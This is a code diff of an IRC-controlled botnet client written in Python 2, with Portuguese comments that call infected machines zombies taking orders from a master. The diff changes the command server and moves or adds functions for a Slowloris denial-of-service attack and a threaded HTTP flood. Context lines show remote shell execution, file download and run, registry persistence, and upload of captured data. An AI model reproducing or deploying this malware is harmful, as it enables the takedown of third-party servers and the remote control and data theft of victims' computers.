@@ -34,7 +34,7 @@ import threading                                  # Funcao onKey(event)
 #                                              C O N F I G U R A C O E S                                              #
 # --------------------------------------------------------------------------------------------------------------------#
 
-ircServer= "irc.underworld.no"                             # Endereco do servidor IRC.
+ircServer= "irc.betachat.net"                             # Endereco do servidor IRC.
 ircChannel= "#amarula424217"                                  # Canal ao qual o Zumbi ira se conectar.
 channelPwd= ""                                   # Password do canal, caso nao haja, deixar em branco.
 masterName= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
@@ -53,33 +53,6 @@ pcprocess = platform.processor()                           # Descricao do Proces
 fileup = ldir + '\capt-' + pcname + '.txt'                 # Auxiliar da funcao upload2(fileup)
 botNick = pcname + "-" + str(random.randint(1, 10000))     # Nick do bot no IRC
 list_of_sockets = []
-user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
-]
 
 # --------------------------------------------------------------------------------------------------------------------#
 #                                        F U N C O E S   O P E R A C I O N A I S                                      #
@@ -109,7 +82,7 @@ def deleteFile():
         else:
             msgSend(ircChannel, "[!] Ops! O arquivo nao existe " + "[ " + delFile + " ] [!]")
     except WindowsError:
-        msgSend(ircChannel, "[!] Porra! Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
+        msgSend(ircChannel, "[!] Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
         msgSend(ircChannel, str(WindowsError))
 
 def download():
@@ -127,16 +100,55 @@ def download():
             f.close()
             msgSend(ircChannel, "[+] Download finalizado de: " + str(file_name) + " [+]")
         except IOError:
-            msgSend(ircChannel, "[!] Papa, Seu inutil! Voce nao tem privilegio para fazer o download. [!]")
+            msgSend(ircChannel, "[!] Papa, Seu inutil! Voce nao tem privilegios para fazer o download. [!]")
     else:
         msgSend(ircChannel, "Ops! Tente usar [http://] ou [https://] na URL")
 
+def getDown(host,port):
+    getusag = UserAgent()
+    print getusag
+    try:
+        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    except socket.error:
+        msgSend(ircChannel, "Error:")
+    else:
+        try:
+            host=socket.gethostbyname(host)
+        except socket.gaierror:
+            #print"Could not resolve hostname."
+            sys.exit()
+        else:
+            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\nUser-Agent: "+random.choice(getusag)+"\n"+headers).encode('utf-8')
+            #print packet
+            if sock.connect_ex((host,port)) == 0:
+                if sock.sendall(packet) == None:
+                    #print"Packet sent successfuly!"
+                    sock.close()
+                else:
+                    print"Error while sending!"
+                    sys.exit()
 
 def getPublicIp():
     # Obtem o IP publico do zumbi
 
     dataIp = str(urlopen('http://checkip.dyndns.com/').read())
     return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(dataIp).group(1)
+
+def init_socket(ip, sport):
+    takeusag = UserAgent()
+    print repr(random.choice(takeusag))
+    #print repr(random.choice(user_agents))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    if sport == 443:
+        s = ssl.wrap_socket(s)
+    s.connect((ip, sport))
+
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    #print random.choice(user_agents)
+    s.send("User-Agent: {}\r\n".format(repr(random.choice(takeusag))).encode("utf-8"))
+    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+    return s
 
 def ipLocal():
     # Obtem o IP local do zumbi
@@ -230,16 +242,16 @@ def persis():
         msgSend(ircChannel, "[+] Nao foi possivel alterar o registro [+]")
 
 def plumDos(threads, host, port):
-    global headers, UsAg
+    global headers, getusag
 
-    UsAg = UserAgent()
+    getusag = UserAgent()
 
     fp = open("C:\Users\Usuario\Desktop\AmarProject\headers.txt", "r")
     headers = fp.read()
     fp.close()
     while True:
         for i in range(threads):
-            th = threading.Thread(target=TakeDown, args=(host, port,), name="User-" + str(1))
+            th = threading.Thread(target=getDown, args=(host, port,), name="User-" + str(1))
             th.Daemon = True  # thread dies if it exits!
             th.start()
             th.join()  # attack sequential
@@ -252,6 +264,33 @@ def run():
         msgSend(ircChannel, fileRun + " executado com sucesso.")
     else:
         msgSend(ircChannel, fileRun + " arquivo nao existe.")
+
+def slowLoris(ip, socket_count, sport):
+# Slowloris attack
+    global list_of_sockets
+    list_of_sockets = []
+    for _ in range(socket_count):
+        try:
+            s = init_socket(ip,sport)
+        except socket.error:
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        for s in list(list_of_sockets):
+            try:
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+            except socket.error:
+                list_of_sockets.remove(s)
+
+        for _ in range(socket_count - len(list_of_sockets)):
+            try:
+                s = init_socket(ip, sport)
+                if s:
+                    list_of_sockets.append(s)
+            except socket.error:
+                break
+        time.sleep(15)
 
 def shell():
     # Habilita comandos shell
@@ -285,79 +324,6 @@ def shell():
             time.sleep(1)
     except:
         msgSend(ircChannel, "[!] Ocorreu um erro na execucao do comando [!]")
-    ###################################################################################################
-
-
-def init_socket(ip, sport):
-    UsAg = UserAgent()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-    if sport == 443:
-        s = ssl.wrap_socket(s)
-    s.connect((ip, sport))
-
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-    #print random.choice(user_agents)
-    s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
-    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-    return s
-
-def slowLoris(ip, socket_count, sport):
-# Slowloris attack
-
-    for _ in range(socket_count):
-        try:
-            s = init_socket(ip,sport)
-        except socket.error:
-            break
-        list_of_sockets.append(s)
-
-    while True:
-        for s in list(list_of_sockets):
-            try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-            except socket.error:
-                list_of_sockets.remove(s)
-
-        for _ in range(socket_count - len(list_of_sockets)):
-            try:
-                s = init_socket(ip, sport)
-                if s:
-                    list_of_sockets.append(s)
-            except socket.error:
-                break
-        time.sleep(15)
-
-def TakeDown(host,port):
-    UsAg = UserAgent()
-    print UsAg
-    try:
-        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    except socket.error:
-        msgSend(ircChannel, "Error:")
-    else:
-        try:
-            host=socket.gethostbyname(host)
-        except socket.gaierror:
-            #print"Could not resolve hostname."
-            sys.exit()
-        else:
-            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\nUser-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
-            #print packet
-            if sock.connect_ex((host,port)) == 0:
-                if sock.sendall(packet) == None:
-                    #print"Packet sent successfuly!"
-                    sock.close()
-                else:
-                    print"Error while sending!"
-                    sys.exit()
-
-def UserAgent():
-    userAg=[]
-    File=open("C:\Users\Usuario\Desktop\AmarProject\UserAgent.txt","rb")   #your path
-    for line in File:
-        userAg.append(line)
-        return userAg
 
 def upload():
     # Faz o upload de um arquivo do cliente para um servidor HTTP
@@ -378,6 +344,14 @@ def upload2(fileup):
     if os.path.exists(fileup):
         files = {'file': open(fileup, 'rb')}
         requests.post(urlUpload, files=files)
+
+def UserAgent():
+    userAg = []
+    File = open("C:\Users\Usuario\Desktop\AmarProject\UserAgent.txt", "rb")  # olhar aqui
+    for line in File:
+        userAg.append(line)
+        return userAg
+
 
 # --------------------------------------------------------------------------------------------------------------------#
 #                                          F U N C O E S   A U X I L I A R E S                                        #
@@ -429,7 +403,7 @@ def main():
                 msgSend(ircChannel, "[+] Sintaxe Invalida [+] tente: <login> <senha>")
             else:
                 if pwd != botPass:
-                    msgSend(ircChannel, "[!] Parado ai, vagabundo: Senha Invalida, ou voce nao pode logar [!]")
+                    msgSend(ircChannel, "[!] Parado ai, vagabundo: senha invalida, ou voce nao pode logar [!]")
                 else:
                     msgSend(ircChannel, "[+] Conectado: bot " + botNick + " aguardando por ordens, Mestre! [+]")
                     login = True
